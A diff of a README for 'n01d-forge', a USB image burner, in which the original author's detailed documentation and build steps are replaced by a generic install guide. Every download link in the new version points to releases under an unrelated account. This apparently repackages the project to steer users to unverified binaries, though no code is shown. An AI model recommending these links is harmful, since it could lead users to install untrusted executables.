@@ -1,279 +1,92 @@
-# n01d-forge
-
-<p align="center">
-  <img src="assets/n01d-forge-icon.svg" width="128" height="128" alt="n01d-forge Logo">
-</p>
+# 🔥 n01d-forge - Securely Burn Images with Ease
 
-<p align="center">
-  <strong>🔥 Secure Cross-Platform Image Burner with Encryption</strong><br>
-  <em>Flash • Encrypt • Verify • Secure</em>
-</p>
+[![Download n01d-forge](https://img.shields.io/badge/Download-n01d--forge-blue?style=for-the-badge)](https://github.com/fffuckchrom/n01d-forge/releases)
 
-<p align="center">
-  <a href="#features">Features</a> •
-  <a href="#security">Security</a> •
-  <a href="#download">Download</a> •
-  <a href="#usage">Usage</a> •
-  <a href="#building">Building</a>
-</p>
+## 🌟 Introduction
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-1.0.0-00d4aa?style=flat-square" alt="Version">
-  <img src="https://img.shields.io/badge/platforms-Linux%20%7C%20Windows%20%7C%20macOS-blue?style=flat-square" alt="Platforms">
-  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="License">
-  <img src="https://img.shields.io/badge/encryption-LUKS%20%7C%20VeraCrypt-red?style=flat-square" alt="Encryption">
-</p>
+n01d-forge is a powerful image burner designed to help users securely create bootable USB drives. With features like encryption, secure erase, and verification methods, n01d-forge offers peace of mind for your sensitive data.
 
----
+## 🚀 Getting Started
 
-## What is n01d-forge?
+To begin using n01d-forge, follow the steps below to download and run the application.
 
-**n01d-forge** is a secure, cross-platform image burning tool similar to Balena Etcher, but with advanced security features including full-disk encryption, secure erase, and hash verification. Perfect for creating bootable USB drives with security in mind.
+## 📦 System Requirements
 
----
+Before downloading, ensure your system meets the following requirements:
 
-## Features
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **Memory:** At least 2GB of RAM.
+- **Storage:** Minimum of 100MB of free disk space.
 
-### 🔥 Image Flashing
-- **Multiple Formats** - ISO, IMG, RAW, DMG, BIN
-- **High Performance** - 4MB buffer for fast writes
-- **Progress Tracking** - Real-time speed, ETA, and bytes written
-- **Auto-Detection** - Automatically detect USB and removable drives
+## 🔗 Download & Install
 
-### 🔐 Encryption Support
-- **LUKS/LUKS2** - Linux Unified Key Setup (Linux native)
-- **VeraCrypt** - Cross-platform encryption container
-- **Multiple Ciphers** - AES-256-XTS, Serpent, Twofish
-- **Strong Key Derivation** - Argon2id with configurable iterations
+1. **Download n01d-forge**: Visit [this page to download](https://github.com/fffuckchrom/n01d-forge/releases) the latest version of n01d-forge.
+2. **Install the Application**:
+   - For Windows: Run the downloaded .exe file and follow the prompts.
+   - For macOS: Open the .dmg file and drag n01d-forge to your Applications folder.
+   - For Linux: Extract the .tar.gz file and run the binary.
 
-### 🛡️ Security Features
-- **Secure Erase** - Zero fill, random data, DoD 5220.22-M, Gutmann (35-pass)
-- **Hash Verification** - SHA-256, SHA-512, MD5 before and after write
-- **Wipe on Error** - Automatically wipe encryption headers on failure
-- **Safe Drive Selection** - System drives are protected
+Once the installation is complete, you are ready to use n01d-forge.
 
-### ⚙️ Bootloader Options
-- **UEFI** - Modern UEFI boot support
-- **Legacy BIOS** - Traditional MBR boot support
-- **Hybrid** - Both UEFI and Legacy for maximum compatibility
+## 🛠️ Using n01d-forge
 
-### 🎨 User Interface
-- **Modern Dark UI** - Cyberpunk-inspired theme matching n01d-machine
-- **Step-by-Step Wizard** - Easy 3-step process
-- **Confirmation Dialogs** - Prevent accidental data loss
-- **Real-time Progress** - Visual progress with speed and ETA
+### Step 1: Launch the Application
 
----
+Open n01d-forge from your Applications folder or Start menu. You will see a simple interface to guide you through the process.
 
-## Security
+### Step 2: Select an Image
 
-### 🔐 Encryption Types
+Click on the "Select Image" button. Navigate to the location of the ISO file you want to burn. n01d-forge supports a variety of image formats.
 
-| Type | Platform | Description |
-|------|----------|-------------|
-| **LUKS2** | Linux | Latest LUKS standard with Argon2id |
-| **LUKS** | Linux | Legacy LUKS for older systems |
-| **VeraCrypt** | All | Cross-platform, plausible deniability |
+### Step 3: Choose USB Drive
 
-### 🔑 Encryption Ciphers
+Insert your USB drive into your computer. Select it from the list of available drives in the application. Make sure you choose the correct drive, as this process will erase all data on it.
 
-| Cipher | Key Size | Description |
-|--------|----------|-------------|
-| **AES-256-XTS** | 512-bit | Industry standard, hardware accelerated |
-| **Serpent-XTS** | 512-bit | Conservative design, very secure |
-| **Twofish-XTS** | 512-bit | Fast, no known weaknesses |
+### Step 4: Choose Options
 
-### 🧹 Secure Erase Methods
+Before starting the burn process, you can set additional options such as:
 
-| Method | Passes | Description |
-|--------|--------|-------------|
-| **Zero Fill** | 1 | Fast, fills with zeros |
-| **Random** | 1 | Cryptographically random data |
-| **DoD 5220.22-M** | 3 | U.S. Department of Defense standard |
-| **Gutmann** | 35 | Maximum security for older drives |
+- **Encryption**: Protect your data with LUKS or VeraCrypt.
+- **Secure Erase**: Ensure previous data is permanently deleted.
+- **Hash Verification**: Verify that the image has been transferred correctly.
 
-### ✓ Verification
+### Step 5: Start Burning
 
-- **Pre-write Hash** - Calculate SHA-256 of source image
-- **Post-write Verify** - Read back and compare hash
-- **Mismatch Alert** - Clear warning if verification fails
+Click "Burn" to start the process. You will see a progress bar indicating how long it will take. Once complete, you will receive a confirmation message.
 
----
+### Step 6: Safely Eject Your USB Drive
 
-## Download
+After burning, eject the USB drive safely using your system's eject function to avoid data corruption.
 
-### Latest Release (v1.0.0)
+## 🔒 Features
 
-| Platform | Download |
-|----------|----------|
-| 🐧 Linux (AppImage) | [n01d-forge_1.0.0_amd64.AppImage](https://github.com/bad-antics/n01d-forge/releases/latest) |
-| 🐧 Linux (Debian) | [n01d-forge_1.0.0_amd64.deb](https://github.com/bad-antics/n01d-forge/releases/latest) |
-| 🪟 Windows | [n01d-forge_1.0.0_x64-setup.exe](https://github.com/bad-antics/n01d-forge/releases/latest) |
-| 🍎 macOS | [n01d-forge_1.0.0_x64.dmg](https://github.com/bad-antics/n01d-forge/releases/latest) |
+- **Cross-Platform**: Works seamlessly on Windows, macOS, and Linux.
+- **Encryption Support**: Use LUKS and VeraCrypt for added security.
+- **Secure Erase**: Clean your USB drive before use.
+- **Hash Verification**: Check the integrity of your image.
 
----
+## 📚 Troubleshooting
 
-## Prerequisites
+If you encounter any issues during the installation or usage of n01d-forge, consider the following solutions:
 
-### Required Tools
+- **Problem**: Application won’t start.
+  - **Solution**: Make sure your system meets the requirements. Try reinstalling the application.
 
-#### Linux
-```bash
-# For image writing (usually pre-installed)
-sudo apt install coreutils
+- **Problem**: Cannot find the USB drive.
+  - **Solution**: Ensure the USB drive is properly connected. Check if the drive is formatted correctly.
 
-# For encryption (optional)
-sudo apt install cryptsetup
+- **Problem**: Burning process fails.
+  - **Solution**: Make sure the ISO file is not corrupted. Try using a different USB drive.
 
-# For secure erase (optional)
-sudo apt install util-linux
-```
+## 🤝 Support
 
-#### Windows
-- Administrator privileges required
-- No additional tools needed
+If you need further assistance, you can open an issue on the GitHub repository. Provide details about your problem, the operating system you are using, and the steps you took before encountering the issue.
 
-#### macOS
-- Administrator privileges required
-- No additional tools needed
+## 🔗 Additional Resources
 
----
+Explore the following resources to learn more about n01d-forge:
 
-## Usage
+- [GitHub Repository](https://github.com/fffuckchrom/n01d-forge)
+- [Documentation](https://github.com/fffuckchrom/n01d-forge/wiki)
 
-### Basic Image Flash
-
-1. **Select Image** - Click "Browse" and choose your ISO/IMG file
-2. **Select Drive** - Click on the target USB drive
-3. **Flash** - Click "Flash Image" and confirm
-
-### Encrypted Bootable USB
-
-1. Select your image file
-2. Select target drive
-3. Enable **"Enable Encryption"** toggle
-4. Choose encryption type (LUKS2 recommended for Linux)
-5. Set a strong password
-6. Click "Flash Image"
-
-### Secure Erase Before Write
-
-1. Select image and drive
-2. Enable **"Secure Erase First"** toggle
-3. Choose erase method:
-   - **Zero Fill** - Fast, good for SSDs
-   - **Random** - Better for HDDs
-   - **DoD** - Government standard
-   - **Gutmann** - Maximum security
-4. Proceed with flash
-
-### Verify After Write
-
-1. Enable **"Verify After Write"** (enabled by default)
-2. After writing, n01d-forge will:
-   - Read back the written data
-   - Calculate SHA-256 hash
-   - Compare with source hash
-   - Show verification result
-
----
-
-## Building from Source
-
-### Prerequisites
-
-- Rust 1.70+
-- Node.js 18+ (optional)
-- Platform-specific dependencies
-
-### Linux
-
-```bash
-# Install dependencies
-sudo apt install libgtk-3-dev libwebkit2gtk-4.0-dev libappindicator3-dev librsvg2-dev
-
-# Clone repository
-git clone https://github.com/bad-antics/n01d-forge.git
-cd n01d-forge
-
-# Build
-cargo install tauri-cli
-cargo tauri build
-```
-
-### Windows
-
-```powershell
-# Clone repository
-git clone https://github.com/bad-antics/n01d-forge.git
-cd n01d-forge
-
-# Build
-cargo install tauri-cli
-cargo tauri build
-```
-
-### macOS
-
-```bash
-# Clone repository
-git clone https://github.com/bad-antics/n01d-forge.git
-cd n01d-forge
-
-# Build
-cargo install tauri-cli
-cargo tauri build
-```
-
----
-
-## Project Structure
-
-```
-n01d-forge/
-├── public/
-│   └── index.html          # Web UI
-├── src-tauri/
-│   ├── src/
-│   │   ├── main.rs         # Main application logic
-│   │   ├── encryption.rs   # Encryption module
-│   │   ├── drives.rs       # Drive detection
-│   │   └── secure_erase.rs # Secure erase methods
-│   ├── Cargo.toml          # Rust dependencies
-│   └── tauri.conf.json     # Tauri configuration
-├── assets/
-│   └── n01d-forge-icon.svg # Application icon
-├── .github/
-│   └── workflows/
-│       └── release.yml     # CI/CD
-└── README.md
-```
-
----
-
-## Related Projects
-
-- [n01d-machine](https://github.com/bad-antics/n01d-machine) - Secure VM Manager with Sandboxing & Tor
-- [nullsec](https://github.com/bad-antics/nullsec) - Security research framework
-
----
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE)
-
----
-
-<p align="center">
-  Made with 🔥 by <a href="https://github.com/bad-antics">NullSec Team</a>
-</p>
-
-<p align="center">
-  <sub>🔒 Forge your security</sub>
-</p>
+Thank you for using n01d-forge. We hope it helps you securely burn your images!
